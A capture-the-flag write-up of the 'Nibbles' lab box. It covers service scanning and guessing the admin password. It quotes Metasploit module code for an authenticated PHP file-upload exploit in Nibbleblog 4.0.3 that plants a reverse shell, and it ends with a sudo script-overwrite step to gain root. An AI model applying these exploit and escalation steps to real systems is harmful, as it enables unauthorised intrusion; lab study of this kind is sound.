# Nibbles - writeup

## Services
```bash
└─$ nmap -sC -sV -p 22,80 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-14 07:09 EDT
Nmap scan report for 10.129.154.76
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```
Both the ssh and httpd versions suggest the box is running Xenial.

## HTTP

Landing page of web app displays "Hello World!" and if we look at the page source we can see a reference to the directory `/nibbleblog/`
```html
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
Sending a request for `/nibbleblog/` sets a `PHPSESSID` cookie, revealing whats running on the backend of this server. So far we have LAP (Linux, Apache, PHP)

enumerating directories on `/nibbleblog/` with gobuster:
```bash
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402]
/content              (Status: 301) [Size: 327] [--> http://10.129.154.76/nibbleblog/content/]
/feed.php             (Status: 200) [Size: 302]
/themes               (Status: 301) [Size: 326] [--> http://10.129.154.76/nibbleblog/themes/]
/admin                (Status: 301) [Size: 325] [--> http://10.129.154.76/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.154.76/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
```
* admin.php - This page prompts for authentication to access nibbleblog admin area
* /plugins/ - view plugins used with the blog
* README - reveals version of nibbleblog `4.0.3`
* /content/ - .xml files that revealed username `admin`

We are unable to bruteforce the password with hydra, because there is an IP blacklist after so many failed attempts.
Luckily the password is easy to guess as its the name of the box `nibbles`.

Now that we have access to the admin area of nibbleblog we can begin searching for know exploits of the version number we extracted. There is an rce for authenticated user for the version of nibbleblog we are working with:
```bash
Nibbleblog 4.0.3 - Arb | php/remote/38489.rb
```

This is a metasploit script, but I'm going to exploit it manually.
This vulnerability is a file upload vulenerability. We will be uploading an image to the plugin My image. Then after navigating to the location that file is stored we php rce and catch a reverse shell.

We can skip the part of the script that test for the version of nibbles since we've already verified it's the vulnerable version. We need to upload a reverse shell to the plugin `my_image`
This creates the form data submitted in the POST request:
```ruby
    data = Rex::MIME::Message.new
    data.add_part('my_image', nil, nil, 'form-data; name="plugin"')
    data.add_part('My image', nil, nil, 'form-data; name="title"')
    data.add_part('4', nil, nil, 'form-data; name="position"')
    data.add_part('', nil, nil, 'form-data; name="caption"')
    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"image\"; filename=\"#{payload_name}\"")
    data.add_part('1', nil, nil, 'form-data; name="image_resize"')
    data.add_part('230', nil, nil, 'form-data; name="image_width"')
    data.add_part('200', nil, nil, 'form-data; name="image_height"')
    data.add_part('auto', nil, nil, 'form-data; name="image_option"')
    post_data = data.to_s
```

This snippet uploads the data with the reverse shell payload
```ruby
    vprint_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      'method'        => 'POST',
      'uri'           => normalize_uri(target_uri, 'admin.php'),
      'vars_get'      => {
        'controller'  => 'plugins',
        'action'      => 'config',
        'plugin'      => 'my_image'
      },
      'ctype'         => "multipart/form-data; boundary=#{data.bound}",
      'data'          => post_data,
      'cookie'        => cookie
    )
``` 
This is just the same as manually navigating to the plugin and selecting configure > upload file. I used the `php_reverse_shell.php` from pentestmonkey.

Then we need to navigate to where the php script is stored to execute it.
```ruby
    payload_url = normalize_uri(target_uri.path, 'content', 'private', 'plugins', 'my_image', php_fname)
    vprint_status("#{peer} - Parsed response.")

    register_files_for_cleanup(php_fname)
    vprint_status("#{peer} - Executing the payload at #{payload_url}.")
    send_request_cgi(
      'uri'     => payload_url,
      'method'  => 'GET'
    )
```
This is the same thing as issuing a GET Request to the path with curl:
```bash
└─$ curl http://10.129.157.135/nibbleblog/content/private/plugins/my_image/image.php
```

Now we catch the shell as nibbler and can grab the user flag.

## privEsc - Root

PrivEsc to root is not challenging at all on this machine as nibbler has root sudo privileges to run a file that they own.
```bash
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
There is a personal.zip file in nibblers home directory with the monitor.sh script in it, but we can instead just make the `/personal/stuff` directories and instert our own script to run a shell as `root`
```bash
nibbler@Nibbles:/home/nibbler$ mkdir -p personal/stuff/
nibbler@Nibbles:/home/nibbler$ echo "/bin/bash -p" > personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ chmod +x personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler# whoami
root
```
